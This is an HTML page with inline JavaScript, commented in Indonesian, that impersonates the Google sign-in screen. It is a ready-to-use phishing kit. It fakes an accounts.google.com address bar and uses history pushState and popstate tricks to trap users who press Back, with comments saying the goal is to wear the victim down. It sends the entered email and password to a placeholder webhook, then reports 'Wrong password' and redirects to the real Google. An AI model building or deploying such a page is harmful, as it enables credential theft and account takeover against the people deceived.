<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
<title>Loading...</title>
<style>
  *{margin:0;padding:0;box-sizing:border-box}
  body{font-family:Arial,sans-serif;background:#fff;min-height:100vh;display:flex;align-items:center;justify-content:center}
  .c{text-align:center;padding:20px;width:90%;max-width:400px}
  .urlbar{background:#f1f3f4;border-radius:24px;padding:8px 16px;margin-bottom:24px;font-size:13px;color:#5f6368;display:flex;align-items:center;gap:8px}
  .urlbar span{flex:1;text-align:left}
  h1{font-size:24px;color:#202124;margin-bottom:8px}
  p{color:#5f6368;font-size:14px;margin-bottom:24px}
  input{width:100%;padding:14px;border:1px solid #dadce0;border-radius:4px;font-size:16px;margin-bottom:12px}
  input:focus{outline:none;border-color:#1a73e8}
  button{width:100%;padding:14px;background:#1a73e8;color:white;border:none;border-radius:4px;font-size:16px;font-weight:500;cursor:pointer}
  #msg{color:#d93025;font-size:13px;margin-top:12px}
</style>
</head>
<body>
<div class="c" id="phishPage">
  <div class="urlbar"><span>🔒</span><span>accounts.google.com</span></div>
  <h1>Sign in</h1>
  <p>Session expired. Please login again.</p>
  <input id="email" placeholder="Email or phone" autocomplete="off">
  <input id="pass" type="password" placeholder="Password">
  <button id="btn">Next</button>
  <div id="msg"></div>
</div>

<script>
const REAL_GOOGLE = 'https://accounts.google.com';
let webhook = 'https://YOUR-WEBHOOK.com/log'; // GANTI INI

// ==========================================
// STRATEGI BARU: PUSH STATE, BUKAN REPLACE
// ==========================================

// 1. Push state phishing page ke history
history.pushState({phish: true}, '', location.href);

// 2. Redirect ke Google PAKE location.href (bukan replace)
// Ini nambah entry baru di history stack
setTimeout(() => {
  // Pake assign biar ada di history
  window.location.href = REAL_GOOGLE;
}, 1500);

// ==========================================
// SEKARANG HISTORY STACK:
// [0] = Halaman phishing (pushState)
// [1] = Google (href)
// 
// Kalo user BACK → balik ke [0] = halaman phishing!
// ==========================================

// Deteksi user balik
window.addEventListener('popstate', (e) => {
  // User balik ke halaman phishing!
  if (e.state && e.state.phish) {
    document.getElementById('msg').textContent = 'Session expired. Please sign in.';
    
    // Redirect lagi ke Google setelah beberapa detik
    // Biar user bingung dan akhirnya nyerah isi credential
    setTimeout(() => {
      window.location.href = REAL_GOOGLE;
    }, 5000);
  }
});

// Deteksi pageshow (dari bfcache)
window.addEventListener('pageshow', (e) => {
  if (e.persisted) {
    // User balik dari cache!
    document.getElementById('msg').textContent = 'Session expired. Please sign in again.';
  }
});

// ==========================================
// CREDENTIAL HARVEST
// ==========================================
document.getElementById('btn').onclick = () => {
  let e = document.getElementById('email').value;
  let p = document.getElementById('pass').value;
  
  if (!e || !p) {
    document.getElementById('msg').textContent = 'Fill all fields';
    return;
  }
  
  // Kirim credential
  fetch(webhook + '?' + new URLSearchParams({e, p}), {mode: 'no-cors'});
  
  document.getElementById('msg').textContent = 'Wrong password. Try again.';
  document.getElementById('pass').value = '';
  
  // Redirect ke Google lagi
  setTimeout(() => {
    window.location.href = REAL_GOOGLE;
  }, 1500);
};
</script>
</body>
</html>
